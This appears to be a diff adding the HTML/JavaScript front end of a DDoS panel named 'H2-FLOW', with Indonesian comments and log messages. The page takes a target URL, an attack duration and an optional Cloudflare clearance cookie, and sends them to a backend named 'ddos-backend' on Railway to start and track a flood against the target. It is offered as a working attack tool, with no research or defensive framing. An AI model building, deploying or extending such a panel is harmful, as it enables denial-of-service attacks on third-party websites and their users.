@@ -1,0 +1,409 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>H2-FLOW Panel</title>
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body {
+            background: #0a0a0a;
+            color: #fff;
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            max-width: 500px;
+            width: 100%;
+            background: #1a1a1a;
+            border-radius: 16px;
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.8);
+            border: 1px solid #2a2a2a;
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .header h1 {
+            font-size: 28px;
+            font-weight: 300;
+            letter-spacing: 2px;
+        }
+        .header h1 span {
+            color: #ff4444;
+            font-weight: 700;
+        }
+        .header p {
+            color: #888;
+            font-size: 12px;
+            margin-top: 5px;
+        }
+        .status-bar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: #0a0a0a;
+            padding: 12px 16px;
+            border-radius: 8px;
+            margin-bottom: 25px;
+            border-left: 3px solid #00ff88;
+        }
+        .status-bar .status-text {
+            font-size: 14px;
+            color: #aaa;
+        }
+        .status-bar .status-text strong {
+            color: #00ff88;
+        }
+        .status-bar .badge {
+            background: #00ff8822;
+            color: #00ff88;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            border: 1px solid #00ff8844;
+        }
+        .form-group {
+            margin-bottom: 18px;
+        }
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            color: #aaa;
+            margin-bottom: 6px;
+            font-weight: 500;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 12px 14px;
+            background: #0a0a0a;
+            border: 1px solid #2a2a2a;
+            border-radius: 8px;
+            color: #fff;
+            font-size: 14px;
+            transition: all 0.3s;
+            outline: none;
+        }
+        .form-group input:focus {
+            border-color: #ff4444;
+            box-shadow: 0 0 20px rgba(255,68,68,0.1);
+        }
+        .form-group input::placeholder {
+            color: #555;
+        }
+        .form-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+        }
+        .btn-attack {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #ff4444, #cc0000);
+            border: none;
+            border-radius: 8px;
+            color: #fff;
+            font-size: 16px;
+            font-weight: 700;
+            letter-spacing: 1px;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 10px;
+        }
+        .btn-attack:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(255,68,68,0.3);
+        }
+        .btn-attack:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+        .logs {
+            margin-top: 25px;
+            background: #0a0a0a;
+            border-radius: 8px;
+            padding: 14px;
+            max-height: 200px;
+            overflow-y: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            border: 1px solid #1a1a1a;
+        }
+        .logs .log-entry {
+            color: #aaa;
+            padding: 4px 0;
+            border-bottom: 1px solid #111;
+        }
+        .logs .log-entry .time {
+            color: #666;
+        }
+        .logs .log-entry .success {
+            color: #00ff88;
+        }
+        .logs .log-entry .error {
+            color: #ff4444;
+        }
+        .logs::-webkit-scrollbar {
+            width: 4px;
+        }
+        .logs::-webkit-scrollbar-track {
+            background: #0a0a0a;
+        }
+        .logs::-webkit-scrollbar-thumb {
+            background: #2a2a2a;
+            border-radius: 4px;
+        }
+        .footer {
+            text-align: center;
+            color: #333;
+            font-size: 11px;
+            margin-top: 20px;
+            border-top: 1px solid #1a1a1a;
+            padding-top: 15px;
+        }
+        @media (max-width: 600px) {
+            .form-row {
+                grid-template-columns: 1fr;
+                gap: 0;
+            }
+            .container {
+                padding: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>⚡ H2-<span>FLOW</span></h1>
+            <p>Web Panel • Diz Flyze Ofc</p>
+        </div>
+        
+        <div class="status-bar" id="statusBar">
+            <div class="status-text">Status: <strong id="statusText">Ready</strong></div>
+            <div class="badge" id="statusBadge">● Online</div>
+        </div>
+        
+        <form id="attackForm">
+            <div class="form-group">
+                <label>🎯 Target URL</label>
+                <input type="url" id="target" placeholder="https://example.com" required>
+            </div>
+            
+            <div class="form-row">
+                <div class="form-group">
+                    <label>⏱️ Duration (s)</label>
+                    <input type="number" id="duration" value="60" min="1" max="120">
+                </div>
+                <div class="form-group">
+                    <label>🍪 Cookie (optional)</label>
+                    <input type="text" id="cookie" placeholder="cf_clearance=...">
+                </div>
+            </div>
+            
+            <button type="submit" class="btn-attack" id="attackBtn">🔥 START ATTACK</button>
+        </form>
+        
+        <div class="logs" id="logContainer">
+            <div class="log-entry">[system] Panel ready</div>
+            <div class="log-entry">[system] Waiting for attack...</div>
+        </div>
+        
+        <div class="footer">
+            YT : DIZFLYZE • Made with ❤️
+        </div>
+    </div>
+
+    <script>
+        // ==================== CONFIG ====================
+        // 🔥 GANTI INI DENGAN URL BACKEND LO DARI RAILWAY!
+        const API_URL = 'https://ddos-backend.up.railway.app'; 
+        
+        // ==================== STATE ====================
+        let isAttacking = false;
+        let attackInterval = null;
+        
+        // ==================== DOM REFS ====================
+        const form = document.getElementById('attackForm');
+        const targetInput = document.getElementById('target');
+        const durationInput = document.getElementById('duration');
+        const cookieInput = document.getElementById('cookie');
+        const attackBtn = document.getElementById('attackBtn');
+        const statusText = document.getElementById('statusText');
+        const statusBadge = document.getElementById('statusBadge');
+        const logContainer = document.getElementById('logContainer');
+        
+        // ==================== LOGGER ====================
+        function addLog(message, type = 'info') {
+            const time = new Date().toLocaleTimeString();
+            const entry = document.createElement('div');
+            entry.className = 'log-entry';
+            
+            let msgClass = '';
+            if (type === 'success') msgClass = 'success';
+            if (type === 'error') msgClass = 'error';
+            
+            entry.innerHTML = `<span class="time">[${time}]</span> <span class="${msgClass}">${message}</span>`;
+            logContainer.appendChild(entry);
+            logContainer.scrollTop = logContainer.scrollHeight;
+            
+            while (logContainer.children.length > 50) {
+                logContainer.removeChild(logContainer.firstChild);
+            }
+        }
+        
+        // ==================== API CALLS ====================
+        async function startAttack(target, duration, cookie) {
+            try {
+                const response = await fetch(`${API_URL}/api/start`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        target: target,
+                        duration: duration,
+                        cookie: cookie || ''
+                    })
+                });
+                
+                if (!response.ok) {
+                    const text = await response.text();
+                    throw new Error(`HTTP ${response.status}: ${text}`);
+                }
+                
+                const data = await response.json();
+                return data;
+            } catch (error) {
+                throw new Error(`Gagal mulai attack: ${error.message}`);
+            }
+        }
+        
+        async function checkHealth() {
+            try {
+                const response = await fetch(`${API_URL}/api/health`);
+                return response.ok;
+            } catch {
+                return false;
+            }
+        }
+        
+        // ==================== UI UPDATES ====================
+        function updateStatus(status, isRunning = false) {
+            statusText.textContent = status;
+            if (isRunning) {
+                statusBadge.textContent = '● Attacking';
+                statusBadge.style.color = '#ff4444';
+                statusBadge.style.borderColor = '#ff444444';
+                statusBadge.style.background = '#ff444422';
+            } else {
+                statusBadge.textContent = '● Online';
+                statusBadge.style.color = '#00ff88';
+                statusBadge.style.borderColor = '#00ff8844';
+                statusBadge.style.background = '#00ff8822';
+            }
+        }
+        
+        function setButtonLoading(loading) {
+            if (loading) {
+                attackBtn.disabled = true;
+                attackBtn.textContent = '⏳ PROCESSING...';
+            } else {
+                attackBtn.disabled = false;
+                attackBtn.textContent = '🔥 START ATTACK';
+            }
+        }
+        
+        // ==================== FORM HANDLER ====================
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            if (isAttacking) {
+                addLog('⛔ Attack masih jalan!', 'error');
+                return;
+            }
+            
+            const target = targetInput.value.trim();
+            const duration = parseInt(durationInput.value);
+            const cookie = cookieInput.value.trim();
+            
+            if (!target) {
+                addLog('❌ Target URL harus diisi!', 'error');
+                return;
+            }
+            
+            if (!target.startsWith('http://') && !target.startsWith('https://')) {
+                addLog('❌ URL harus pake http:// atau https://', 'error');
+                return;
+            }
+            
+            if (isNaN(duration) || duration < 1 || duration > 120) {
+                addLog('❌ Durasi harus 1-120 detik', 'error');
+                return;
+            }
+            
+            const healthy = await checkHealth();
+            if (!healthy) {
+                addLog('❌ Backend offline! Hubungi admin.', 'error');
+                return;
+            }
+            
+            isAttacking = true;
+            setButtonLoading(true);
+            updateStatus('Starting...', true);
+            
+            addLog(`🚀 Mulai attack ke ${target} selama ${duration}s...`, 'success');
+            
+            try {
+                const result = await startAttack(target, duration, cookie);
+                addLog(`✅ Attack jalan! ID: ${result.id || 'N/A'}`, 'success');
+                updateStatus(`Attacking (${duration}s)`, true);
+                
+                let remaining = duration;
+                attackInterval = setInterval(() => {
+                    remaining--;
+                    if (remaining <= 0) {
+                        clearInterval(attackInterval);
+                        attackInterval = null;
+                        isAttacking = false;
+                        setButtonLoading(false);
+                        updateStatus('Ready', false);
+                        addLog('✅ Attack selesai!', 'success');
+                    } else {
+                        updateStatus(`Attacking (${remaining}s)`, true);
+                    }
+                }, 1000);
+                
+            } catch (error) {
+                addLog(`❌ ${error.message}`, 'error');
+                isAttacking = false;
+                setButtonLoading(false);
+                updateStatus('Error', false);
+            }
+        });
+        
+        window.addEventListener('beforeunload', () => {
+            if (attackInterval) {
+                clearInterval(attackInterval);
+            }
+        });
+        
+        addLog('✅ Panel siap!', 'success');
+        
+        setTimeout(async () => {
+            const healthy = await checkHealth();
+            if (healthy) {
+                addLog('✅ Backend terhubung!', 'success');
+            } else {
+                addLog('⚠️ Backend gak ada! Cek API_URL.', 'error');
+            }
+        }, 1000);
+    </script>
+</body>
+</html>
